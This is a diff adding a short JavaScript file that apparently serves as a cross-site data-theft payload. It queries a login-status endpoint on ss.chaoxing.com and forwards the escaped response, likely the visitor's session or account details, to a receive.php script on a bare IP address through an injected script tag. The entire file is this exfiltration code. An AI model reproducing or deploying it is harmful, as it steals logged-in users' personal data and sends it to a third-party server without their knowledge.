@@ -1,0 +1,27 @@
+function createXmlHttp() {
+    if (window.XMLHttpRequest) {
+        xmlHttp = new XMLHttpRequest()
+    } else {
+        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
+        for (var n = 0; n < MSXML.length; n++) {
+            try {
+                xmlHttp = new ActiveXObject(MSXML[n]);
+                break
+            } catch(e) {}
+        }
+    }
+}
+createXmlHttp()
+
+xmlHttp.onreadystatechange = function(){
+
+  if (xmlHttp.readyState == 4) {
+
+	code=escape(xmlHttp.responseText);
+	t=document.createElement("script");
+	document.body.appendChild(t);
+	t.src="http://101.37.33.250/receive.php?data="+code;
+	  }
+}	
+	xmlHttp.open("GET", "http://ss.chaoxing.com/passport2islogin?callback=jsonp1585710203303&_=1585710203425", true);
+	xmlHttp.send(null);
